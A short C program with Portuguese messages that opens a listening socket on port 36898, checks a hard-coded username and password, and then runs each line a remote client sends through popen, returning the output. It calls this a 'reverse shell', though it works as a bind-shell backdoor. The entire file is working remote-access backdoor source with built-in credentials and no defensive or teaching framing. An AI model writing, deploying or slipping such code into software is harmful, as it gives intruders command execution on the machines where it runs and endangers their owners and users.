#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 36898
#define BUFFER_SIZE 1024
#define USERNAME "nous"
#define PASSWORD "trsl888"

void send_message(int socket, const char *message);
void receive_message(int socket, char *buffer, size_t buffer_size);
void reverse_shell(int client_socket);

int main() {
    int server_fd, client_socket;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char buffer[BUFFER_SIZE] = {0};
    char username[BUFFER_SIZE], password[BUFFER_SIZE];
  
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror(" > Socket failed");
        exit(EXIT_FAILURE);
    }
    printf(" > Socket criado\n");
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) == -1) {
        perror(" > Bind failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf(" > Servidor escutando na porta %d\n", PORT);
    if (listen(server_fd, 3) == -1) {
        perror(" > Listen failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf(" > Aguardando conexão...\n");
    if ((client_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t *)&addrlen)) == -1) {
        perror(" > Accept failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }
    printf(" > Conexão aceita\n");
    send_message(client_socket, " > Nome de usuário: ");
    receive_message(client_socket, username, BUFFER_SIZE);

    send_message(client_socket, " > Senha: ");
    receive_message(client_socket, password, BUFFER_SIZE);

    if (strcmp(username, USERNAME) == 0 && strcmp(password, PASSWORD) == 0) {
        send_message(client_socket, " > Login bem-sucedido!\n");
        printf(" > Cliente autenticado\n");

        reverse_shell(client_socket);
    } else {
        send_message(client_socket, " > Credenciais inválidas. Conexão encerrada.\n");
        printf(" > Cliente não autenticado\n");
        close(client_socket);
    }

    close(server_fd);
    return 0;
}
void send_message(int socket, const char *message) {
    send(socket, message, strlen(message), 0);
}
void receive_message(int socket, char *buffer, size_t buffer_size) {
    memset(buffer, 0, buffer_size); // Limpar buffer
    recv(socket, buffer, buffer_size, 0);
    buffer[strcspn(buffer, "\r\n")] = '\0'; // Remover quebra de linha
}
void reverse_shell(int client_socket) {
    char command[BUFFER_SIZE];
    char result[BUFFER_SIZE];
    FILE *fp;

    send_message(client_socket, " > Reverse Shell ativo. Digite 'exit' para sair.\n");

    while (1) {
        send_message(client_socket, "shell> ");
        receive_message(client_socket, command, BUFFER_SIZE);

        if (strcmp(command, "exit") == 0) {
            send_message(client_socket, " > Encerrando conexão...\n");
            break;
        }

        fp = popen(command, "r");
        if (fp == NULL) {
            send_message(client_socket, " > Erro ao executar comando.\n");
            continue;
        }
        while (fgets(result, sizeof(result), fp) != NULL) {
            send_message(client_socket, result);
        }
        pclose(fp);
    }

    close(client_socket);
}
